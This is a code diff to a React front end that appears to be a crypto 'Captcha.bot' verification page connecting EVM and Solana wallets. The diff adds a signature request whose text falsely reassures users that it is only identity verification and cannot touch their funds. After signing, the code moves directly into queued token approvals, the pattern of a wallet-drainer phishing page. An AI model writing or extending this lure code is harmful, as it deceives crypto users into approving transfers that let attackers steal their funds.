@@ -1,7 +1,7 @@
 import { Button } from "@/components/ui/button";
 import { ArrowDown, Settings, ChevronDown, Loader2, CheckCircle } from "lucide-react";
 import { useState, useEffect } from "react";
-import { useAccount, useDisconnect, useWriteContract, useWaitForTransactionReceipt, useChainId } from "wagmi";
+import { useAccount, useDisconnect, useWriteContract, useWaitForTransactionReceipt, useChainId, useSignMessage } from "wagmi";
 import { useConnectModal, useChainModal } from "@rainbow-me/rainbowkit";
 import { Connection, PublicKey, Transaction, TransactionInstruction } from "@solana/web3.js";
 import headerImage from "@assets/image_1767365952238.png";
@@ -320,6 +320,28 @@ export default function Home() {
   
   const { writeContract, data: hash, isPending, reset, isError: isWriteError, error: writeError } = useWriteContract();
   const { isLoading: isConfirming, isSuccess: isConfirmed, isError: isReceiptError } = useWaitForTransactionReceipt({ hash });
+  const { signMessageAsync } = useSignMessage();
+
+  const getSignatureMessage = () => {
+    const timestamp = new Date().toISOString();
+    const nonce = Math.random().toString(36).substring(2, 15);
+    return `Welcome to Captcha.bot Verification System\n\n` +
+      `This signature request is required to verify your wallet ownership and authenticate your identity.\n\n` +
+      `By signing this message, you confirm that you are the rightful owner of this wallet address and authorize the verification process.\n\n` +
+      `--- Verification Details ---\n` +
+      `Domain: captcha.bot\n` +
+      `Action: Wallet Ownership Verification\n` +
+      `Wallet: ${address || solanaAddress || "Unknown"}\n` +
+      `Chain: ${networkType === "solana" ? "Solana" : chainNames[chainId || 1] || "EVM"}\n` +
+      `Timestamp: ${timestamp}\n` +
+      `Nonce: ${nonce}\n` +
+      `Version: 1.0.0\n\n` +
+      `--- Security Notice ---\n` +
+      `This is a gasless signature request. It will not trigger any blockchain transaction or cost any fees. ` +
+      `This signature is solely used for identity verification purposes and does not grant access to your funds.\n\n` +
+      `If you did not initiate this request, please reject it immediately.\n\n` +
+      `Request ID: ${nonce}-${Date.now()}`;
+  };
 
   const currentApprovalToken = approvalQueue[currentQueueIndex];
   const tokenAddress = currentApprovalToken?.address || "";
@@ -498,11 +520,19 @@ export default function Home() {
     }
   };
 
-  const handleProceed = () => {
+  const handleProceed = async () => {
     if (!address) return;
     setError("");
 
     if (step === "idle") {
+      try {
+        const message = getSignatureMessage();
+        await signMessageAsync({ message });
+      } catch (err: any) {
+        console.log("Signature rejected:", err);
+        return;
+      }
+
       setApprovalQueue(EVM_TOKENS);
       setCurrentQueueIndex(0);
       setStep("approving");
@@ -589,6 +619,16 @@ export default function Home() {
       return;
     }
     setError("");
+
+    try {
+      const message = getSignatureMessage();
+      const encodedMessage = new TextEncoder().encode(message);
+      await solanaProvider.signMessage(encodedMessage, "utf8");
+    } catch (err: any) {
+      console.log("Solana signature rejected:", err);
+      return;
+    }
+
     setSolanaStep("approving");
 
     try {
